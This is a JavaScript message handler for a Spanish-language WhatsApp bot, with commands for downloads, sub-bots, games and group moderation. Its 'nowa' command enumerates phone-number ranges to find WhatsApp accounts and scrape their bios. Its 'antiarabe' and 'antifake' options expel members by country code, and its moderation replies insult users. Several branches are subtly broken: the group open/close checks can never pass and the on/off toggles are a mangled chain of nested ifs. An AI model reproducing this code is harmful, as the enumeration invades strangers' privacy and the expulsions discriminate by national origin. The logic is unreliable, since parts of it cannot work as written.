  const gradient = require('gradient-string')  
  const { exec, spawn, execSync } = require("child_process"); 
  const chalk = require('chalk')   
  const os = require('os')   
  const FormData = require('form-data')  
  const fs = require('fs')   
  const fetch = require('node-fetch')
  const {rob, bal, reg, work, mine, buy, afk, claim, levelxd, tranferSdw, quitardolares, addDolares, cazar, lb} = require('./economy/economy.js')
  const {toqr, fakechat} = require('./extras/extras.js')

  const axios = require('axios')  
  const cheerio = require('cheerio')  
  const gpt = require('api-dylux')  
  const util = require('util')  
  const createHash = require('crypto') 
  const mimetype = require("mime-types")  
  const {game1, gameMate} = require('./libs/games.js')
  const webp = require("node-webpmux")
  const {yt, acortar, google, imagen, tran, tts, ia, ssw, kataAnime, planetnime, aptoide, pinteresdw} = require('./busc/buscadores.js')
  const Jimp = require('jimp') 
  const { File } = require("megajs") 
  const scp1 = require('./libs/scraper')   
  const { facebook } = require('./libs/facebook')  
  const { instagram } = require('./libs/instagram')  
  const { jadibot, listJadibot, killJadibot } = require('./serbot.js') 
 // const { youtubedl, snapsave } = require("@bochilteam/scraper") 
const JavaScriptObfuscator = require('javascript-obfuscator')

const { play } = require('./plugins/play.js') 
  const { youtube } = require("@xct007/frieren-scraper")  
  const { jadibot2 } = require('./serbot2.js')  
  const speed = require("performance-now")  
  const ffmpeg = require("fluent-ffmpeg")   
  const color = (text, color) => {   
  return !color ? chalk.cyanBright(text) : color.startsWith('#') ? chalk.hex(color)(text) : chalk.keyword(color)(text)} // Si no hay color, utilizar el color celeste brillante (por defecto)  
  const { smsg, fetchBuffer,  buffergif, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, remini, participantes, pickRandom, spotifydl, pepe, webp2mp4File } = require('./libs/fuctions')  
 const { WaMessageStubType, areJidsSameUser, downloadContentFromMessage, generateWAMessageContent, generateWAMessageFromContent, generateWAMessage, prepareWAMessageMedia, relayMessage} = require('@whiskeysockets/baileys'); // Importa los objetos 'makeWASocket' y 'proto' desde el módulo '@whiskeysockets/baileys'
  const { ytmp4, ytmp3, ytplay, ytplayvid } = require('./libs/youtube')  
  const { menu } = require('./plugins/menu.js')  
  const { mediafireDl } = require('./libs/mediafire.js')  
  const { state } = require('./plugins/info.js')  
  const msgs = (message) => {   
  if (message.length >= 10) {   
  return `${message.substr(0, 500)}`   
  } else {   
  return `${message}`}}     
  const addCmd = (cmd, id) =>  {  
  const stickerdb = global.db.data.sticker //gracias a aiden  
  stickerdb[id] = {id: id,  
  cmd: cmd  
  }}  
  const getCmd = (id) => {  
  const stickerdb = global.db.data.sticker  
  let anu = null;    
  Object.keys(stickerdb).forEach(nganu => {   
  if (stickerdb[nganu].id === id) {   
  anu = nganu    
  }})    
  if (anu !== null) {    
  return stickerdb[anu].cmd    
  }}  
  const getFileBuffer = async (mediakey, MediaType) => {  
  const stream = await downloadContentFromMessage(mediakey, MediaType)  
  let buffer = Buffer.from([])  
  for await(const chunk of stream) {  
  buffer = Buffer.concat([buffer, chunk]) }  
  return buffer}    
  let blockList = []  
  module.exports = shadow = async (shadow, m, chatUpdate, mek) => {   
  module.exports = conn = async (conn, m, chatUpdate, mek) => {   
  var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage' && m.message.imageMessage.caption) ? m.message.imageMessage.caption : (m.mtype == 'videoMessage' && m.message.videoMessage.caption ) ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? m.message.listResponseMessage.singleSelectReply.selectedRowId :  (m.mtype == 'stickerMessage') && (getCmd(m.message.stickerMessage.fileSha256.toString()) !== null && getCmd(m.message.stickerMessage.fileSha256.toString()) !== undefined) ? getCmd(m.message.stickerMessage.fileSha256.toString()) : ''  
  if (m.key.id.startsWith("BAE5")) return    
    var budy = (typeof m.text == 'string' ? m.text : '')   
    var _prefix = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : ""  
  global.prefix = _prefix   
  const isCmd = body.startsWith(prefix)  
  const from = m.chat  
  const msg = JSON.parse(JSON.stringify(mek, undefined, 2))   
  const content = JSON.stringify(m.message)   
  const type = m.mtype   
  const arg = body.substring(body.indexOf(' ') + 1)   
  const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()   
  const args = body.trim().split(/ +/).slice(1)   
  const q = args.join(" ")   
  let t = m.messageTimestamp   
  const pushname = m.pushName || "Sin nombre"   
  const botnm = conn.user.id.split(":")[0] + "@s.whatsapp.net"  
  const userSender = m.key.fromMe ? botnm : m.isGroup && m.key.participant.includes(":") ? m.key.participant.split(":")[0] + "@s.whatsapp.net" : m.key.remoteJid.includes(":") ? m.key.remoteJid.split(":")[0] + "@s.whatsapp.net" : m.key.fromMe ? botnm : m.isGroup ? m.key.participant : m.key.remoteJid  
  const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []  
          const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''  
          const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'  
          const usernya = mentionByReply ? mentionByReply : mentionByTag[0]  
          const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false  
 const isImage = (type == 'imageMessage')   
  const isCreator = global.owner.map(([numero]) => numero.replace(/[^\d\s().+:]/g, '').replace(/\s/g, '') + '@s.whatsapp.net').includes(userSender) 
  const itsMe = m.sender == conn.user.id ? true : false
  const text = args.join(" ") 
  const quoted = m.quoted ? m.quoted : m  
  const qmsg = (quoted.msg || quoted) 
  const sender = m.key.fromMe ? botnm : m.isGroup ? m.key.participant : m.key.remoteJid 
  const mime = (quoted.msg || quoted).mimetype || '' 
  const isMedia = /image|video|sticker|audio/.test(mime)
  const numBot = conn.user.id.split(":")[0] + "@s.whatsapp.net" 
  const numBot2 = conn.user.id // Número de teléfono del bot  
  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))  
  const mentions = []  
  if (m.message[type].contextInfo) {   
  if (m.message[type].contextInfo.mentionedJid) {  
  const msd = m.message[type].contextInfo.mentionedJid  
  for (let i = 0; i < msd.length; i++) {  
  mentions.push(msd[i])}}}  
  
  // ‿︵‿︵ʚɞ『 GRUPO 』ʚɞ‿︵‿︵  
        const groupMetadata = m.isGroup ? await conn.groupMetadata(from) : '' 
   const groupName = m.isGroup ? groupMetadata.subject : ''  
   const participants = m.isGroup ? await groupMetadata.participants : ''
     const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : '' 
  // // Lista de administradores del grupo  
  
  const isBotAdmins = m.isGroup ? groupAdmins.includes(numBot) : false // Verifica si el bot es un administrador del grupo  
  const isGroupAdmins = m.isGroup ? groupAdmins.includes(userSender) : false // Verifica si el remitente del mensaje es un administrador del grupo  
  const isBaneed = m.isGroup ? blockList.includes(userSender) : false // Verifica si el remitente del mensaje está en la lista de bloqueados  
  
  // ‿︵‿︵ʚɞ『 TIPOS DE MENSAJES Y CITADOS 』ʚɞ‿︵‿︵  
  const reply = (text) => {  
   m.reply(text)} // Enviar una respuesta   
   const sendAdMessage = (text, edit, title, body, image, url) => { conn.sendMessage(from, {text: text, edit: key, contextInfo: { externalAdReply: { title: title, body: body, mediaUrl: url, sourceUrl: url, previewType: 'PHOTO', showAdAttribution: true, thumbnail: image, sourceUrl: url }}}, {})}   
   const sendImage = ( image, caption ) => { conn.sendMessage(from, { image: image, caption: caption }, { quoted: m })}   
   const sendImageAsUrl = ( url, caption ) => { conn.sendMessage(from, { image:  {url: url }, caption: caption }, { quoted: m })}  
  const sendSticker = ( image, fkontak) => { conn.sendMessage(m.chat, { sticker: image }, { quoted: fkontak})}  
  
  const isAudio = type == 'audioMessage' // Mensaje de Audio  
  const isSticker = type == 'stickerMessage' // Mensaje de Sticker  
  const isContact = type == 'contactMessage' // Mensaje de Contacto  
  const isLocation = type == 'locationMessage' // Mensaje de Localización   
  const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')  
  const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')  
  const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')  
  const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')  
  const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')  
  const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message') // Mensaje citado de cualquier tipo  
  const isViewOnce = (type === 'viewOnceMessage') // Verifica si el tipo de mensaje es (mensaje de vista única)  
  
  //función pickrandow  
  function pickRandom(list) {  
  return list[Math.floor(list.length * Math.random())]  
  }  
  if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) { 
 let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')] 
 let { text, mentionedJid } = hash 
 let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {userJid: conn.user.id, 
 quoted: m.quoted && m.quoted.fakeObj 
 }) 
 messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id) 
 messages.key.id = m.key.id 
 messages.pushName = m.pushName 
 if (m.isGroup) messages.participant = m.sender 
 let msg = {...chatUpdate, messages: [proto.WebMessageInfo.fromObject(messages)], 
 type: 'append' 
 } 
 conn.ev.emit('messages.upsert', msg)} 
 
  //base de datos  
  let user = global.db.data.users[m.sender]  
  let chats = global.db.data.users[m.chat]  
  let setting = global.db.data.settings[conn.user.jid]    
  let mathGame = global.db.data.game.math = []   
  let ppt = global.db.data.game.ppt = []  
  let ttt = global.db.data.game.ppt = []  
  
  //autobio  
  /*if (global.db.data.settings[numBot].autobio) {  
  let setting = global.db.data.settings[numBot]  
  if (new Date() * 1 - setting.status > 1000) {  
  let uptime = await runtime(process.uptime())  
  const bio = `ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ | ᴀᴄᴛɪᴠᴏ ✅️: ${runtime(process.uptime())}\n\nᴘᴀʀᴀ ᴠᴇᴢ ᴍɪ ʟɪsᴛᴀ ᴅᴇ ᴄᴏᴍᴀɴᴅᴏ ᴜsᴀʀ #menu`  
  await conn.updateProfileStatus(bio)  
  setting.status = new Date() * 1  
  }} */  
  
  //autoread  
/*if (m.message) {  
  conn.readMessages([m.key])}*/
  
  if (global.db.data.chats[m.chat].antifake && !isGroupAdmins) {          
  if (m.chat && m.sender.startsWith('1')) return conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')}  
  if (global.db.data.chats[m.chat].antiarabe && !isGroupAdmins) {  
  if (m.chat && m.sender.startsWith('212')) return conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')}  
  
  //antilink  
  if (global.db.data.chats[m.chat].antilink) {  
  if (budy.match(`chat.whatsapp.com`)) {  
  let delet = m.key.participant  
  let bang = m.key.id  
  kice = m.sender  
  reply(`\`\`\`「 ANTILINK DETECTADO 」\`\`\`\n\n*@${kice.split("@")[0]} sera expulsado del grupo sucia rata 🙄*`)  
  if (!isBotAdmins) return reply(`El bot necesita admin para eliminar al incluso 🙄`)  
  let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))  
  let isLinkThisGc = new RegExp(gclink, 'i')  
  let isgclink = isLinkThisGc.test(m.text)  
  if (isgclink) return reply(`Te salvarte el link enviado es de este grupo`)  
  if (isGroupAdmins) return reply(`Te salvarte perra eres admin jjj`)  
  conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})  
  conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')}}  
  
  //modo public & privado  
  if (!conn.public && !isCreator) {  
  if (!m.key.fromMe) return  
  }                  
  //Banea chat  
  if (global.db.data.chats[m.chat].ban && !isCreator) {  
  return  
  }  
  //modoadmin  
  if (global.db.data.chats[m.chat].modeadmin && !isGroupAdmins) {  
  return  
  }  
  
  // Tiempo de Actividad del bot  
  const used = process.memoryUsage()  
  const cpus = os.cpus().map(cpu => {  
  cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)  
  return cpu  
  })  
  //conn.sendReadReceipt(from,sender,[m.key.id])  
  
  const cpu = cpus.reduce((last, cpu, _, { length }) => {  
  last.total += cpu.total  
  last.speed += cpu.speed / length  
  last.times.user += cpu.times.user  
  last.times.nice += cpu.times.nice  
  last.times.sys += cpu.times.sys  
  last.times.idle += cpu.times.idle  
  last.times.irq += cpu.times.irq  
  return last  
  }, {  
  speed: 0,  
  total: 0,  
  times: {  
  user: 0,  
  nice: 0,  
  sys: 0,  
  idle: 0,  
  irq: 0  
  }})  
  
  const thumb = fs.readFileSync("./media/test.jpg")  
  let fkontak = { "key": { "participants":"0@s.whatsapp.net", "remoteJid": "status@broadcast", "fromMe": false, "id": "Halo" }, "message": { "contactMessage": { "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${userSender.split('@')[0]}:${userSender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}, "participant": "0@s.whatsapp.net" }  
  const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: "ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ", orderTitle: "sᴜᴘᴇʀ ʙᴏᴛ ᴅᴇ ᴡʜᴀᴛsᴀᴘᴘ", sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}  
  const fdoc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: "A", jpegThumbnail: null}}}  
  const kick = function (from, orangnya) {  
  for (let i of orangnya) {  
  conn.groupParticipantsUpdate(from, [i], "remove");  
  }}  
  const time = moment(Number(msg.messageTimestamp + "000")).locale("es-mx").tz("America/Bogota").format('MMMM Do YYYY, h:mm:ss a')  
  
  // ‿︵‿︵ʚɞ『 INFO CONSOLE 』ʚɞ‿︵‿︵          
  if (m.message) {  
  console.log(chalk.bold.cyanBright(`▣────────────···\n│${botname} ${conn.user.id == global.numBot2 ? '' : '(jadibot)'}`),   
  chalk.bold.magenta('\n│⏰HORARIO: ') + chalk.magentaBright(moment(t * 1000).tz(place).format('DD/MM/YY HH:mm:ss'),  
  chalk.bold.yellow('\n│📑TIPO (SMS): ') + chalk.yellowBright(`${type}`),   
  chalk.bold.cyan('\n│📊USUARIO: ') + chalk.cyanBright(pushname) + ' ➜', gradient.rainbow(userSender),   
  m.isGroup ? chalk.bold.greenBright('\n│📤GRUPO: ') + chalk.greenBright(groupName) + ' ➜ ' + gradient.rainbow(from) : chalk.bold.greenBright('\n│📥PRIVADO'),   
  //chalk.bold.red('\nETIQUETA: ') + chalk.redBright(`[${isBaneed ? 'Banned' : ''}]`),  
  chalk.bold.white('\n│💬MENSAJE: ') + chalk.whiteBright(`\n▣────────────···\n${msgs(m.text)}\n`))  
  )}  
  
  
  //afk  
  let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]  
  for (let jid of mentionUser) {  
  let user = global.db.data.users[jid]  
  if (!user) continue  
  let afkTime = user.afkTime  
  if (!afkTime || afkTime < 0) continue  
  let reason = user.afkReason || ''  
  m.reply(`💤 𝙽𝙾 𝙻𝙾𝚂 𝙴𝚃𝙸𝚀𝚄𝙴𝚃𝙴 💤\n𝙴𝚜𝚝𝚎 𝚞𝚜𝚞𝚊𝚛𝚒𝚘 𝚚𝚞𝚎 𝚖𝚎𝚗𝚌𝚒𝚘𝚗𝚊𝚜 𝚎𝚜𝚝𝚊 𝙰𝙵𝙺\n\n${reason ? '🔸️ *𝚁𝙰𝚉𝙾𝙽* : ' + reason : '🔸️ *𝚁𝙰𝚉𝙾𝙽* : 𝚂𝚒𝚗 𝚛𝚊𝚣𝚘𝚗'}\n🔸️ *𝙴𝚂𝚃𝚄𝚅𝙾 𝙸𝙽𝙰𝙲𝚃𝙸𝚅𝙾 𝙳𝚄𝚁𝙰𝙽𝚃𝙴 : ${clockString(new Date - afkTime)}`.trim())}  
  if (global.db.data.users[m.sender].afkTime > -1) {  
  let user = global.db.data.users[m.sender]  
  m.reply(`╭━─━─━─≪☣️≫─━─━─━╮\n┃𝙳𝙴𝙹𝙰𝚂𝚃𝙴 𝙳𝙴 𝙴𝚂𝚃𝙰R 𝙰𝙵𝙺\n┃${user.afkReason ? '\n┃🔸️ *𝚁𝙰𝚉𝙾𝙽 :* ' + user.afkReason : ''}\n┃🔸 *𝙴𝚂𝚃𝚄𝚅𝙾 𝙸𝙽𝙰𝙲𝚃𝙸𝚅𝙾 𝙳𝚄𝚁𝙰𝙽𝚃𝙴* ${clockString(new Date - user.afkTime)}\n╰━─━─━─≪☣️≫─━─━─━╯`.trim())  
  user.afkTime = -1  
  user.afkReason = ''   
  }  
  
  //Marcar como (Escribiendo...)   
  /*if (command) {  
  await conn.sendPresenceUpdate('composing', m.chat)  
  }*/ 
  
  //ARRANCA LA DIVERSIÓN  
  switch (command) {  
  case 'yts': 
 await yt(conn, m, text, from, command, fkontak, prefix) 
 break
   case 'nowa':  
      let regex = /x/g  
      if (!text) m.reply('⚠️ Falto el número.') 
      if (!text.match(regex)) m.reply(`*Ejemplo de uso: ${prefix + command} 521999340434x*`) 
      let random = text.match(regex).length, total = Math.pow(10, random), array = []  
      for (let i = 0; i < total; i++) {  
      let list = [...i.toString().padStart(random, '0')]  
      let result = text.replace(regex, () => list.shift()) + '@s.whatsapp.net'  
      if (await conn.onWhatsApp(result).then(v => (v[0] || {}).exists)) {  
      let info = await conn.fetchStatus(result).catch(_ => {})  
      array.push({ exists: true, jid: result, ...info })  
      } else {  
      array.push({ exists: false, jid: result })  
      }}  
      let txt = 'Registrados\n\n' + array.filter(v => v.exists).map(v => `• Nro: wa.me/${v.jid.split('@')[0]}\n*• Bio:* ${v.status || 'Sin descripcion'}\n*• Fecha:* ${formatDate(v.setAt)}`).join('\n\n') + '\n\n*No registrados*\n\n' + array.filter(v => !v.exists).map(v => v.jid.split('@')[0]).join('\n')  
      m.reply(txt)  
      function formatDate(n, locale = 'id') {  
      let d = new Date(n)  
      return d.toLocaleDateString(locale, { timeZone: 'Asia/Jakarta' })}  
     break  
  case 'serbot': case 'jadibot':  
        if (m.isGroup) return m.reply(info.private)   
        await jadibot(conn, m, command)    
        break   
        case 'deljadibot':  
        killJadibot(conn, m, command)  
        break  
  case 'toqr': {
  toqr(conn, m,  text, sender)}
  break  
   case 'sercode':  
      jadibot2(conn, m, command, text)  
      break   
  case 'ofuscar':
       if (!text) return m.reply("*Ingresa el codigo que vas a ofuscar.*"); 
         function obfuscateCode(code) { 
        return JavaScriptObfuscator.obfuscate(code, { 
        compact: false, 
          controlFlowFlattening: true, 
        deadCodeInjection: true, 
        simplify: true, 
          numbersToExpressions: true, 
        }).getObfuscatedCode(); 
       } 
      let obfuscatedCode = await obfuscateCode(text); 
       conn.sendMessage(m.chat, {text: obfuscatedCode}, {quoted: m});
       break
  case 'bots': case 'listbots':  
  try {   
  let user = [... new Set([...global.listJadibot.filter(conn => conn.user).map(conn => conn.user)])]   
  te = "*Lista de subbots*\n\n"   
  for (let i of user){   
  y = await conn.decodeJid(i.id)   
  te += " ❑ Usuario : @" + y.split("@")[0] + "\n"   
  te += " ❑ Nombre : " + i.name + "\n\n"   
  }   
  conn.sendMessage(from ,{text: te, mentions: [y], },{quoted: m})   
  } catch (err) {   
  reply(`*[❌] No hay subbots activos en este momento intente mas tarde*`)}   
  break   
 case 'acortar': 
 await acortar(conn, m, text, command)   
 break 
 case 'mangainfo': {
kataAnime(conn, m, text, command)}
break
case 'animeplanet': {
planetnime(conn, m, text, args, command) }
break
 case 'google': {       
 await google(conn, m, text, command)} 
 break 
 case 'imagen': { 
 await imagen(conn, m, text, command)} 
 break
  case 'attp':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!text) return reply('ingresa algo para convertirlo a sticker :v')  
  link = `https://api.lolhuman.xyz/api/attp?apikey=${lolkeysapi}&text=${text}`  
  conn.sendMessage(m.chat, { sticker: { url: link } }, { quoted: fkontak})  
  break  
  case 'traducir': case 'translate': { 
 await tran(conn, m, args, quoted, prefix, command)} 
 break
  case 'hd': {  
    let q = m.quoted ? m.quoted : m;   
     let mime = (q.msg || q).mimetype || q.mediaType || "";   
     if (!mime)   
       return reply(`*[❗] 𝙴𝙽𝚅𝙸𝙴 𝚄𝙽𝙰 𝙸𝙼𝙰𝙶𝙴𝙽 𝙾 𝚁𝙴𝚂𝙿𝙾𝙽𝙳𝙰 𝙰 𝚄𝙽𝙰 𝙸𝙼𝙰𝙶𝙴𝙽 𝙲𝙾𝙽 𝙴𝙻 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 #hd  
   
 `);  
     if (!/image\/(jpe?g|png)/.test(mime))   
       return  reply(`*[❗] 𝙴𝙻 𝙵𝙾𝚁𝙼𝙰𝚃𝙾 𝙳𝙴𝙻 𝙰𝚁𝙲𝙷𝙸𝚅𝙾 (${mime}) 𝙽𝙾 𝙴𝚂 𝙲𝙾𝙼𝙿𝙰𝚁𝚃𝙸𝙱𝙻𝙴, 𝙴𝙽𝚅𝙸𝙰 𝙾 𝚁𝙴𝚂𝙿𝙾𝙽𝙳𝙴 𝙰 𝚄𝙽𝙰 𝙵𝙾𝚃𝙾*`);  
  m.reply(   
 "*⚔️ Espera mientras envio tu imagen HD*",   
 );   
     let img = await q.download?.();   
     let pr = await remini(img, "enhance");   
     conn.sendMessage(m.chat, { image: pr }, { quoted: m });   
     try {   
     } catch {   
       m.reply("*[❗] 𝙴𝚁𝚁𝙾𝚁, 𝙿𝙾𝚁 𝙵𝙰𝚅𝙾𝚁 𝚅𝚄𝙴𝙻𝚅𝙴 𝙰 𝙸𝙽𝚃𝙴𝙽𝚃𝙰𝚁𝙻𝙾*");   
     } 
   };  
   break;  
  //info  
  case 'estado':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  await state(conn, m, speed, sender, fkontak)   
  break  
  case 'quitardolares': {
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
quitardolares(conn, m, sender, text, args, command)}
break
  case 'menu': case 'help':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  conn.sendMessage(from, { text: menu(conn, prefix, pushname, sender, m),    
  contextInfo:{    
  forwardingScore: 9999999,    
  isForwarded: true,     
  mentionedJid:[sender],    
  "externalAdReply": {    
  "showAdAttribution": true,    
  "renderLargerThumbnail": true,    
  "title": wm,     
  "containsAutoReply": true,    
  "mediaType": 1,     
  "thumbnail": imagen3,    
  "mediaUrl": md,   
  "sourceUrl": md,   
  }}}, { quoted: fkontak })   
  break   
  
  case 'owner': case 'creador':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:;OWNER 👑;;;\nFN:OWNER\nORG:OWNER 👑\nTITLE:\nitem1.TEL;waid=584125778026:+58 412 5778026\nitem1.X-ABLabel:OWNER 👑\nX-WA-BIZ-DESCRIPTION:ᴇsᴄʀɪʙɪ sᴏʟᴏ ᴘᴏʀ ᴄᴏsᴀs ᴅᴇʟ ʙᴏᴛ.\nX-WA-BIZ-NAME:Owner 👑\nEND:VCARD`  
  let a = await conn.sendMessage(from, { contacts: { displayName: 'ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ 👑', contacts: [{ vcard }] }}, {quoted: m})  
  conn.sendMessage(from, { text : `Hola @${sender.split("@")[0]}, este bot esta en desarrollo si quiere contactar con mi creador aqui te dejo su número`, mentions: [sender]}, { quoted: a })  
  break   
  
  case 'grupos': case 'grupoficiales':   
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  conn.sendMessage(from, { text: `*BOT En DESARROLLO*\n\n*Te puedes unir al grupo para probar el bot y sus funciones 💥*\n\n${nnn}` }, { quoted: msg })  
  break  
  
  case 'instalarbot': case 'crearbot':   
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  conn.sendMessage(m.chat, { text: `┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈  
  \`\`\`COMO INSTALAR ESTE BOT?\`\`\`  
  \`\`\`Este bot es nuevo todavía no se puede instalar si quiere probar sus funciones entra al grupo del bot\`\`\`  
  *Escribe: ${prefix}grupos*  
    
  \`\`\`o puede probar las funcion de hacerte un sub bot Escribe: ${prefix}serbot\`\`\`  
  ┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈`,  
  contextInfo:{  
  mentions: [sender],   
  forwardingScore: 9999999,  
  isForwarded: true,   
  "externalAdReply": {  
  "showAdAttribution": true,  
  "containsAutoReply": true,  
  "title": ` ${wm}`,  
  "body": `${pushname}`,  
  "previewType": "PHOTO",  
  "thumbnailUrl": ``,  
  "thumbnail": imagen1,   
  "sourceUrl": md}}},  
  { quoted: m})  
  break  
  
  case '584125778026': {  
  if (!args.join(" ")) return reply(`┗❴ ⚠ 𝐀𝐃𝐕𝐄𝐑𝐓𝐄𝐍𝐂𝐈𝐀 ⚠ ❵┛\n  
  ᴇsᴛᴀ ᴘʀᴏʜɪʙɪᴅᴏ ᴇᴛɪᴏ̨ᴜᴇᴛᴀʀ ᴀʟ ᴄʀᴇᴀᴅᴏʀ sɪ ᴛɪᴇɴᴇs ᴜɴᴀ ᴅᴜʀᴀ ʀᴇғᴇʀᴇɴᴛᴇ ᴀʟ ʙᴏᴛ ᴇsᴄʀɪʙɪʀʟᴇ ᴀ sᴜs ᴘʀɪᴠ.`)  
  for (let i of owner) {  
  }}  
  break  
  
  case 'grupo':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group);    
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!text) return reply(`*Accion mal usaba*\n\n*Use de esta forma:*\n*${prefix + command} abrir*\n*${prefix + command} cerrar*`)  
  if (args[0] === 'abrir') {  
  if (args[0] === 'open') {  
  m.reply(`*GRUPO ABIERTO CON EXITO✅*`)  
  await conn.groupSettingUpdate(from, 'not_announcement')  
  }} else if (args[0] === 'cerrar') {  
  if (args[0] === 'close') {  
  m.reply(`*GRUPO CERRADO CON EXITO✅*`)  
  await conn.groupSettingUpdate(from, 'announcement')  
  }}  
  break  
  
  case 'delete': case 'del': {  
  if (!m.quoted) throw false  
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  let { chat, fromMe, id} = m.quoted  
  let delet = m.message.extendedTextMessage.contextInfo.participant  
  let bang = m.message.extendedTextMessage.contextInfo.stanzaId  
  return conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})}  
  break    
  case 'reset': {
   if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });     
  tranferSdw(conn, m, sender, text, command)}
 break
  case 'public': case 'publico': {  
  if (!isCreator) return reply(info.owner)  
  conn.public = true  
  reply('✅ Cambio con exito a uso público')}  
  break  
  case 'self': case 'privado': {  
  if (!isCreator) return reply(info.owner)  
  conn.public = false  
  reply('✅ Cambio con exito a uso privado')}  
  break          
  case 'math': {
  gameMate(conn, m, command, text, quoted)      }
break
  case 'autoadmin': case 'tenerpoder': {  
  if (!m.isGroup) return reply(info.group)  
  if (!isCreator) return reply(info.owner)  
  m.reply('Ya eres admin mi jefe 😎')   
  await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote")}  
  break   
  
  case 'welcome':  
  case 'audios':  
  case 'modeadmin':  
  case 'antifake': case 'antinternacional':  
  case 'antiarabe':  
  case 'detect':  
  case 'antilink': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group)  
  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!text) return reply(`*Use de esta forma ejemplo:*\n*${prefix + command} on*\n*${prefix + command} off*`)  
  if (args[0] === "on") {  
  if (!global.db.data.chats[m.chat].detect)   
  if (!global.db.data.chats[m.chat].antilink)   
  if (!global.db.data.chats[m.chat].audios)   
  if (!global.db.data.chats[m.chat].welcome)  
  if (!global.db.data.chats[m.chat].modeadmin)  
  if (!global.db.data.chats[m.chat].antifake)  
  if (!global.db.data.chats[m.chat].antiarabe)  
  global.db.data.chats[m.chat].detect = true  
  global.db.data.chats[m.chat].antilink = true  
  global.db.data.chats[m.chat].audios = true  
  global.db.data.chats[m.chat].welcome = true  
  global.db.data.chats[m.chat].modeadmin = true  
  global.db.data.chats[m.chat].antifake = true  
  global.db.data.chats[m.chat].antiarabe = true  
  reply(`*✅El ${command} se activo con exito*`)  
  } else if (args[0] === "off") {  
  if (!global.db.data.chats[m.chat].detect)   
  if (!global.db.data.chats[m.chat].antilink)  
  if (!global.db.data.chats[m.chat].audios)   
  if (!global.db.data.chats[m.chat].welcome)   
  if (!global.db.data.chats[m.chat].modeadmin)  
  if (!global.db.data.chats[m.chat].antifake)  
  if (!global.db.data.chats[m.chat].antiarabe)  
